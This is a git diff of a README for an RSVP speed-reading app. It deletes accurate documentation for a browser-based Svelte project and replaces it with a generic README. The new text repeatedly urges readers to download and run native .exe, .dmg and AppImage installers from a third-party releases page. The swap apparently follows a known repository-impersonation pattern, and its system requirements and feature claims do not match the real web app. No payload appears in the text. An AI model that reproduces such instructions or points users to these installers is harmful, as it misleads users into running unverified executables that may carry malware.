@@ -1,365 +1,94 @@
-# RSVP Reader
+# 📚 rsvp-reading - Enjoy Reading in RSVP Style
 
-A Svelte-based Rapid Serial Visual Presentation (RSVP) reader for speed reading with PDF and EPUB support.
+## 🚀 Getting Started
 
-## Online version / DEMO
+Welcome to the rsvp-reading application! This software helps you read text in a unique RSVP format, improving your reading speed and comprehension. Follow the simple steps below to get started.
 
-Link: https://rsvp.n0name.eu/
+## 📥 Download
 
-<video src="rsvp-clip.mp4" controls width="600"></video>
+[![Download rsvp-reading](https://img.shields.io/badge/Download%20rsvp--reading-v1.0-blue.svg)](https://github.com/qamarahmad/rsvp-reading/releases)
 
-## What is RSVP?
+## 💻 System Requirements
 
-Rapid Serial Visual Presentation (RSVP) is a technique where text is displayed one word at a time at a fixed focal point. This eliminates the need for eye movements (saccades) during reading, potentially allowing for significantly faster reading speeds.
+To run rsvp-reading smoothly, please ensure your device meets the following requirements:
 
-The app uses **Optimal Recognition Point (ORP)** highlighting - the red letter in each word indicates the point where your eye naturally focuses for fastest word recognition. This is calculated based on word length:
+- **Operating System**: Windows 10 or later, macOS High Sierra or later, or a modern Linux distribution.
+- **RAM**: At least 4 GB of RAM.
+- **Storage**: Minimum of 100 MB of free space.
 
-- 1-3 letter words: 1st letter
-- 4-5 letter words: 2nd letter
-- 6-9 letter words: 3rd letter
-- 10+ letter words: 4th letter
+## 🛠️ Installation Steps
 
-## Features
+### Step 1: Visit the Releases Page
 
-- **PDF & EPUB Support**: Upload PDF documents or EPUB e-books directly
-- **Adjustable reading speed**: 50-1000 words per minute (WPM)
-- **ORP highlighting**: Red-highlighted focal letter for faster recognition
-- **Monospace display**: Fixed-width font keeps the focal point stable
-- **Focus mode**: Minimal UI during reading for distraction-free experience
-- **Fade effect**: Optional smooth transitions between words
-- **Punctuation pauses**: Configurable extra pause on sentence-ending punctuation
-- **Periodic pauses**: Optional pause every N words for comprehension
-- **Progress tracking**: Visual progress bar and time remaining
-- **Save progress**: Save your reading session and resume later
-- **Jump to position**: Skip to any word number or percentage in the text
-- **Clickable progress bar**: Click anywhere on the progress bar to jump to that position
-- **Keyboard shortcuts**: Full keyboard control for hands-free reading
-- **Dark theme**: Easy on the eyes with black background
+To download rsvp-reading, visit the releases page. Click the link below:
 
-## Installation
+[Download rsvp-reading](https://github.com/qamarahmad/rsvp-reading/releases)
 
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/rsvp.git
-cd rsvp
+### Step 2: Choose Your Version
 
-# Install dependencies
-npm install
+On the releases page, you will see different versions of the application. Look for the latest version, which will be at the top of the list. 
 
-# Start development server
-npm run dev
-```
+### Step 3: Download the Installer
 
-## Docker
+Once you find the latest version, click on the installer file that matches your operating system:
 
-Run the app using Docker Compose:
+- **Windows**: Look for a file ending in `.exe`.
+- **macOS**: Look for a file ending in `.dmg`.
+- **Linux**: Look for a file ending in `.AppImage` or relevant package.
 
-```bash
-cd docker
-docker compose up -d
-```
+### Step 4: Run the Installer
 
-The app will be available at http://localhost:8080
+After the download completes, follow these steps based on your operating system:
 
-To rebuild after changes:
+#### For Windows:
 
-```bash
-docker compose up -d --build
-```
+1. Locate the downloaded `.exe` file in your downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the prompts to complete the installation.
 
-## Usage
+#### For macOS:
 
-### Running the App
+1. Locate the downloaded `.dmg` file.
+2. Double-click the file to open it.
+3. Drag the rsvp-reading icon to your Applications folder.
+4. You can now find rsvp-reading in your Applications.
 
-```bash
-# Development mode with hot reload
-npm run dev
-
-# Build for production
-npm run build
-
-# Preview production build
-npm run preview
-```
-
-### Loading Content
-
-**From Files:**
-1. Click the document icon in the header
-2. Click "Upload PDF or EPUB"
-3. Select your PDF or EPUB file
-4. The text will be extracted and loaded automatically
-
-**From Text:**
-1. Click the document icon in the header
-2. Paste or type your text in the textarea
-3. Click "Load Text"
-
-### Controls
-
-**Buttons:**
-- **Play**: Start reading from the beginning or current position
-- **Pause**: Pause reading (UI enters focus mode with minimal controls)
-- **Resume**: Continue from where you paused
-- **Stop**: Stop and reset to beginning
-- **Restart**: Stop and immediately start from beginning
-
-**Keyboard Shortcuts:**
-| Key | Action |
-|-----|--------|
-| `Space` | Play/Pause/Resume |
-| `Escape` | Exit focus mode (or close dialogs) |
-| `Arrow Up` | Increase speed (+25 WPM) |
-| `Arrow Down` | Decrease speed (-25 WPM) |
-| `Arrow Left` | Go back one word |
-| `Arrow Right` | Skip forward one word |
-| `G` | Open jump to position dialog |
-| `Ctrl+S` / `Cmd+S` | Save current progress |
-
-### Saving and Resuming Progress
-
-**Save Progress:**
-- Click the save icon in the header (floppy disk icon)
-- Or press `Ctrl+S` (Windows/Linux) or `Cmd+S` (Mac)
-- Your current position, text, and all settings are saved to browser storage
-
-**Resume Reading:**
-- When you return to the app, you'll be prompted to resume your saved session
-- Click "Resume" to continue from where you left off
-- Click "Start Fresh" to begin with the default text
-
-### Jump to Position
-
-**Using the Jump Dialog:**
-1. Click the code bracket icon in the header, or press `G`
-2. Enter a word number (e.g., `150`) or percentage (e.g., `50%`)
-3. Click "Go" or press Enter
-
-**Quick Jump Buttons:**
-- Use the preset buttons (Start, 25%, 50%, 75%) for quick navigation
-
-**Clickable Progress Bar:**
-- When not playing, click anywhere on the progress bar to jump directly to that position
-- The progress bar expands on hover to make clicking easier
-
-### Settings
-
-Click the gear icon to access settings:
-
-- **Words Per Minute**: Reading speed (50-1000 WPM)
-- **Enable Fade Effect**: Smooth fade transition between words
-- **Fade Duration**: Duration of fade effect (50-300ms)
-- **Pause on Punctuation**: Extra pause at sentence endings
-- **Punctuation Pause Multiplier**: How much longer to pause (1-4x)
-- **Pause Every N Words**: Take a break every N words (0 = disabled)
-- **Pause Duration**: Length of periodic pauses (100-2000ms)
-
-## Project Structure
-
-```
-rsvp/
-├── src/
-│   ├── App.svelte              # Main application component
-│   ├── app.css                 # Global styles
-│   ├── main.js                 # Application entry point
-│   ├── lib/
-│   │   ├── rsvp-utils.js       # Core RSVP utility functions
-│   │   ├── file-parsers.js     # PDF and EPUB parsing utilities
-│   │   ├── progress-storage.js # Session save/load utilities
-│   │   └── components/
-│   │       ├── RSVPDisplay.svelte   # Word display component
-│   │       ├── Controls.svelte      # Playback controls
-│   │       ├── Settings.svelte      # Settings panel
-│   │       ├── TextInput.svelte     # Text/file input panel
-│   │       └── ProgressBar.svelte   # Progress indicator (clickable)
-│   └── tests/
-│       ├── setup.js                 # Test setup
-│       ├── rsvp-utils.test.js       # RSVP utility tests
-│       ├── file-parsers.test.js     # File parser tests
-│       └── progress-storage.test.js # Progress storage tests
-├── index.html
-├── package.json
-├── vite.config.js
-└── README.md
-```
-
-## Testing
-
-```bash
-# Run tests in watch mode
-npm test
-
-# Run tests once
-npm run test:run
-
-# Run tests with coverage
-npm run test:coverage
-```
-
-## API Reference
-
-### Utility Functions (`src/lib/rsvp-utils.js`)
-
-#### `parseText(text)`
-Parses input text into an array of words.
-
-```javascript
-parseText('Hello world') // ['Hello', 'world']
-```
-
-#### `getORPIndex(word)`
-Calculates the Optimal Recognition Point index for a word.
-
-```javascript
-getORPIndex('hello') // 1 (second letter 'e')
-```
-
-#### `getActualORPIndex(word)`
-Gets the actual character index for ORP, accounting for leading punctuation.
-
-```javascript
-getActualORPIndex('"hello') // 2 (skips the quote)
-```
-
-#### `getWordDelay(word, wpm, pauseOnPunctuation, multiplier)`
-Calculates the display delay for a word based on WPM and punctuation.
-
-```javascript
-getWordDelay('hello', 300) // 200 (ms)
-getWordDelay('end.', 300, true, 2) // 400 (ms)
-```
-
-#### `formatTimeRemaining(remainingWords, wpm)`
-Formats remaining time as MM:SS.
-
-```javascript
-formatTimeRemaining(300, 300) // '1:00'
-```
-
-#### `splitWordForDisplay(word)`
-Splits a word into parts for ORP display.
-
-```javascript
-splitWordForDisplay('hello')
-// { before: 'h', orp: 'e', after: 'llo' }
-```
-
-#### `shouldPauseAtWord(wordIndex, pauseAfterWords)`
-Checks if reading should pause at the current word.
-
-```javascript
-shouldPauseAtWord(10, 10) // true
-shouldPauseAtWord(5, 10)  // false
-```
-
-### File Parsers (`src/lib/file-parsers.js`)
-
-#### `parsePDF(file)`
-Extracts text content from a PDF file.
-
-#### `parseEPUB(file)`
-Extracts text content from an EPUB e-book.
-
-#### `parseFile(file)`
-Auto-detects file type and parses accordingly.
-
-#### `getSupportedExtensions()`
-Returns supported file extensions (`.pdf,.epub`).
-
-### Progress Storage (`src/lib/progress-storage.js`)
-
-#### `saveSession(session)`
-Saves the current reading session to localStorage.
-
-```javascript
-saveSession({
-  text: 'Your text content...',
-  currentWordIndex: 150,
-  totalWords: 500,
-  settings: { wordsPerMinute: 300 }
-}) // true
-```
-
-#### `loadSession()`
-Loads a saved reading session from localStorage.
-
-```javascript
-const session = loadSession()
-// { text: '...', currentWordIndex: 150, totalWords: 500, settings: {...}, savedAt: 1234567890 }
-```
-
-#### `hasSession()`
-Checks if a saved session exists.
-
-```javascript
-hasSession() // true or false
-```
-
-#### `clearSession()`
-Removes the saved session from localStorage.
-
-```javascript
-clearSession() // true
-```
-
-#### `getSessionSummary()`
-Gets session info without loading the full text.
-
-```javascript
-getSessionSummary()
-// { currentWordIndex: 150, totalWords: 500, savedAt: 1234567890, hasText: true }
-```
-
-#### `percentageToWordIndex(percentage, totalWords)`
-Converts a percentage to a word index.
-
-```javascript
-percentageToWordIndex(50, 100) // 50
-percentageToWordIndex(25, 200) // 50
-```
-
-#### `wordIndexToPercentage(wordIndex, totalWords)`
-Converts a word index to a percentage.
-
-```javascript
-wordIndexToPercentage(50, 100) // 50
-wordIndexToPercentage(25, 50) // 50
-```
-
-## Browser Support
-
-Works in all modern browsers:
-- Chrome (recommended)
-- Firefox
-- Safari
-- Edge
-
-## Dependencies
-
-- **pdfjs-dist**: PDF parsing
-- **epubjs**: EPUB e-book parsing
-- **Svelte 5**: UI framework
-- **Vite**: Build tool
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## License
-
-This project is open source and available under the [MIT License](LICENSE).
-
-## Acknowledgments
-
-- Based on RSVP research in cognitive psychology
-- Inspired by various speed reading applications
-- Built with [Svelte](https://svelte.dev/) and [Vite](https://vitejs.dev/)
-- PDF parsing powered by [PDF.js](https://mozilla.github.io/pdf.js/)
-- EPUB parsing powered by [Epub.js](https://github.com/futurepress/epub.js/)
+#### For Linux:
 
+1. Locate the downloaded application file.
+2. Open a terminal and navigate to the directory where the file is.
+3. Run the command `chmod +x rsvp-reading.AppImage` to make it executable.
+4. Then, run the command `./rsvp-reading.AppImage` to start the application.
+
+## 🖥️ Using rsvp-reading
+
+When you open rsvp-reading, you'll see a simple interface. Here’s how to use it:
+
+1. **Input Text**: Copy and paste any text you want to read into the input box.
+2. **Adjust Settings**: Customize the reading speed and text size using the sliders.
+3. **Start Reading**: Press the "Start" button to begin your reading experience.
+
+## 📚 Features
+
+- **RSVP Format**: Reads text in a rapid serial visual presentation format.
+- **Customizable Speed**: Adjust how fast the text appears based on your comfort.
+- **User-Friendly Interface**: Designed for easy navigation, perfect for all users.
+
+## 🔧 Troubleshooting
+
+If you encounter issues, here are some common problems and solutions:
+
+- **The application won't start**: Ensure your device meets the system requirements. Try reinstalling the application.
+- **Text is not appearing**: Check that you have entered text into the input box.
+
+## 📞 Support
+
+If you need assistance, feel free to reach out. You can raise an issue in the GitHub repository or check the discussions section for helpful information.
+
+## 📥 Revisit the Download Page
+
+For updates or a fresh download, visit our releases page again:
+
+[Download rsvp-reading](https://github.com/qamarahmad/rsvp-reading/releases)
+
+Thank you for choosing rsvp-reading! Enjoy transforming your reading experience.
